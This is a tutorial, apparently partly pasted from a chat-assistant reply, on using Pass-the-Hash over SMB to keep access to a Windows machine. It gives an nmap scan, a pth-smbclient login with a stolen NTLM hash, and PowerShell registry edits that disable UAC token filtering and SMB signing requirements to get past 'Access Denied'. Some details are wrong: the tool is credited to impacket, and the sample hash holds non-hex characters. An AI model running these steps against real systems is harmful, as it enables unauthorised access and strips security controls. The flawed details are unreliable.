### Maintaining Access: Pass-the-Hash Attack 

**Prerequisites for Pass-the-Hash Attack**
To successfully perform a Pass-the-Hash (PtH) attack and maintain access using SMB, you must ensure the following:

1. **Obtain the Hash**: 
   - The attacker must have the NTLM hash of a valid user. This user must have administrative privileges or belong to the Administrators group on the target system.
   
2. **Administrator Privileges**:
   - The user whose hash is obtained needs to be part of the local administrators or domain admin group on the target machine for privileged access.

3. **Open Services (like SMB)**:
   - The target system must have SMB (port 445) open to facilitate the connection. Other services could be checked for vulnerabilities, but for this example, we focus on SMB.

 **Steps to Scan the Target**
Before performing the Pass-the-Hash attack, you should scan the target for open services. Here’s an example using `nmap`:

```bash
nmap -p 445 --script smb-enum-shares <target-ip>
```

This will check if SMB is open on the target. If SMB is available, you can proceed with the attack.

**Pass-the-Hash Attack on SMB**

Assuming you have the NTLM hash for a user with administrative rights, you can use the `impacket` suite for the Pass-the-Hash attack. Here’s an example:

```bash
pth-smbclient -hashes <NTLM_hash> <username>@<target-ip>
```

Example:
```bash
pth-smbclient -hashes ab12cd34ef56gh78ijklmnopqrstuvwx admin@192.168.1.10
```

Once you connect, you can browse or interact with the SMB shares.

Thank you for pointing that out. Let's correct the registry modification and handle the "Access Denied" situation properly in a Pass-the-Hash attack context.

> Correct Handling of Access Denied (Command=117)
>When trying to use Pass-the-Hash for SMB and encountering access issues with the error message similar to **"command=117"**, this is typically related to SMB security settings that require a certain level of signing or prevent privileged access over the network.

 **Solution: Modifying the Required Registry Settings**

To resolve this, you need to modify two key registry values to allow the administrative hash to work properly over SMB and avoid issues like **Access Denied**.

1. **Registry Key 1: `LocalAccountTokenFilterPolicy`**

   This key allows local administrative users to authenticate over the network without User Account Control (UAC) interference.

   **PowerShell Command:**
   ```powershell
   New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType DWord -Force
   ```

2. **Registry Key 2: `RequireSecuritySignature`**

   This setting forces SMB to use message signing, which can prevent certain operations, like Pass-the-Hash attacks, if enabled. Disabling it can help overcome the "Access Denied" issue.

   You need to create a new `DWORD (32-bit)` value named `RequireSecuritySignature` and set it to `0` under the `LanmanServer` settings.

   **PowerShell Command:**
   ```powershell
   New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0 -PropertyType DWord -Force
   ```

